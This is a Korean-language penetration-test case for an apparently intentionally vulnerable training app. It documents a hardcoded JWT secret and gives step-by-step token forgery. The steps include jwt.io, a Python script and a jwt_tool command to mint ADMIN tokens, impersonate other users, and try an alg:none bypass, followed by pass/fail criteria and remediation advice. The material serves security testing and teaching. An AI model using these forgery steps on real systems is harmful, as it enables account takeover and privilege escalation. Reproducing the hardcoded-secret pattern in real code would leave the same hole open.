================================================================================
[VCE-AUTH-01] JWT 시크릿 하드코딩으로 인한 토큰 위조
도메인: auth
================================================================================

## 1. 진단 항목 개요

- **항목명**: JWT Secret Key 하드코딩 → 임의 토큰 위조
- **번호**: AUTH-01
- **위험도**: Critical
- **OWASP**: A07:2021 – Identification and Authentication Failures

## 2. 대상 기능 & 엔드포인트

| 항목 | 내용 |
|------|------|
| 로컬 | http://localhost:8080/api/auth/login |
| 운영 | https://vceapp.com/api/auth/login |
| HTTP 메서드 | POST (로그인) → JWT 획득 후 모든 인증 API에 사용 |
| 인증 요건 | 없음 (공격 자체가 인증 우회) |

영향 받는 엔드포인트:
- GET  /api/auth/me
- POST /api/orders
- GET  /api/admin/members (ADMIN 위조 시)
- 그 외 Bearer 토큰 기반 모든 API

## 3. 취약점 원리 (Why this works)

JWT(JSON Web Token)는 Header.Payload.Signature 세 부분으로 구성된다.
Signature는 `HMACSHA256(base64(header) + "." + base64(payload), SECRET_KEY)` 로 생성된다.
SECRET_KEY가 공격자에게 알려지면, 공격자는 임의의 Payload(role, email 등)로 서명이 유효한 토큰을 직접 생성할 수 있다.

`JwtTokenProvider.java:18`에 시크릿 키가 소스코드에 하드코딩되어 있다:
```java
private static final String SECRET_KEY =
    "vce_secret_key_for_educational_purpose_only_do_not_use_in_production";
```

공개 저장소(GitHub)에 소스코드가 노출되거나, 역컴파일, 오류 메시지 등을 통해 키가 유출되면
공격자는 다음을 수행할 수 있다:
1. 임의의 이메일을 subject로 하는 USER 역할 JWT 위조 → 타 사용자 사칭
2. ADMIN 역할 JWT 위조 → 관리자 기능 전체 접근
3. 만료 시간을 임의로 설정하여 영구 토큰 생성

블랙박스 관점에서도, 위의 시크릿 키 문자열 패턴("educational_purpose" 등)은
JWT 크래킹 도구(hashcat, jwt_tool)의 wordlist에 쉽게 포함되어 오프라인 크랙이 가능하다.

## 4. 테스트 절차 (Step-by-step)

### [사전 준비]
1. Burp Suite 실행, 브라우저 프록시 설정 (127.0.0.1:8080)
2. test@vce.com / test1234 로 로그인하여 정상 JWT 획득
3. jwt.io 또는 jwt_tool 준비

---

### Step 1. 정상 JWT 구조 분석

정상 로그인 요청:
```
POST /api/auth/login HTTP/1.1
Host: localhost:8080
Content-Type: application/json

{
  "email": "test@vce.com",
  "password": "test1234"
}
```

응답에서 JWT 토큰 추출. jwt.io에 붙여넣어 Payload 확인:
```json
{
  "sub": "test@vce.com",
  "role": "USER",
  "iat": 1700000000,
  "exp": 1700086400
}
```

---

### Step 2. 시크릿 키로 ADMIN 토큰 위조

**방법 A — jwt.io 사용**:
1. jwt.io → Debugger 탭
2. Algorithm: HS256
3. Payload를 다음으로 변경:
```json
{
  "sub": "admin@vce.com",
  "role": "ADMIN",
  "iat": 1700000000,
  "exp": 9999999999
}
```
4. Verify Signature 칸에 시크릿 키 입력:
   `vce_secret_key_for_educational_purpose_only_do_not_use_in_production`
5. 생성된 JWT 복사

**방법 B — Python 스크립트**:
```python
import jwt
import time

SECRET = "vce_secret_key_for_educational_purpose_only_do_not_use_in_production"

payload = {
    "sub": "admin@vce.com",
    "role": "ADMIN",
    "iat": int(time.time()),
    "exp": int(time.time()) + 99999999
}

token = jwt.encode(payload, SECRET, algorithm="HS256")
print(token)
```

**방법 C — jwt_tool 사용**:
```bash
python3 jwt_tool.py <정상토큰> -T -S hs256 \
  -p "vce_secret_key_for_educational_purpose_only_do_not_use_in_production"
```

---

### Step 3. 위조 토큰으로 관리자 API 접근

```
GET /api/admin/members HTTP/1.1
Host: localhost:8080
Authorization: Bearer <위조된_ADMIN_JWT>
```

```
PATCH /api/admin/members/1/status HTTP/1.1
Host: localhost:8080
Authorization: Bearer <위조된_ADMIN_JWT>
Content-Type: application/json

{
  "status": "ACTIVE"
}
```

---

### Step 4. 일반 사용자 사칭 (IDOR 확장)

```python
payload = {
    "sub": "victim@vce.com",   # 타 사용자 이메일
    "role": "USER",
    "iat": int(time.time()),
    "exp": int(time.time()) + 99999999
}
```

위조 토큰으로 /api/auth/me, /api/orders 등 접근 시 피해자 계정으로 인식됨.

---

### Step 5. alg:none 공격 시도 (추가 테스트)

```
--- HTTP 요청 예시 ---
GET /api/auth/me HTTP/1.1
Host: localhost:8080
Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbkB2Y2UuY29tIiwicm9sZSI6IkFETUlOIiwiZXhwIjo5OTk5OTk5OTk5fQ.
---
```
(마지막 `.` 뒤 서명 없는 none 알고리즘 토큰)

## 5. 취약 여부 판단 기준

✅ **취약 (Vulnerable)**:
- 위조 토큰으로 GET /api/admin/members → HTTP 200 응답 + 사용자 목록 반환
- 위조 토큰으로 GET /api/auth/me → admin@vce.com 계정 정보 반환
- alg:none 토큰 → 서명 없이 인증 통과

✗ **안전 (Not Vulnerable)**:
- HTTP 401 Unauthorized 반환
- HTTP 403 Forbidden 반환
- "Invalid token" 또는 "Signature verification failed" 응답

## 6. 예상 취약 포인트 (코드 위치)

- `JwtTokenProvider.java:18` — `SECRET_KEY` 하드코딩
- `JwtTokenProvider.java:47-53` — `Jwts.builder()`로 토큰 생성 시 하드코딩 키 사용
- `SecurityConfig.java` — JWT 검증 필터가 해당 키로 서명 검증

## 7. 권고 조치

- 시크릿 키를 환경변수 또는 외부 설정에서 로드: `@Value("${jwt.secret}")`
- 키 길이 최소 256비트 이상의 무작위 문자열 사용
- JWT JTI(JWT ID) 필드 추가 및 로그아웃 시 블랙리스트 관리
- alg 필드를 서버에서 강제 지정 (HS256), 클라이언트 제공 알고리즘 무시
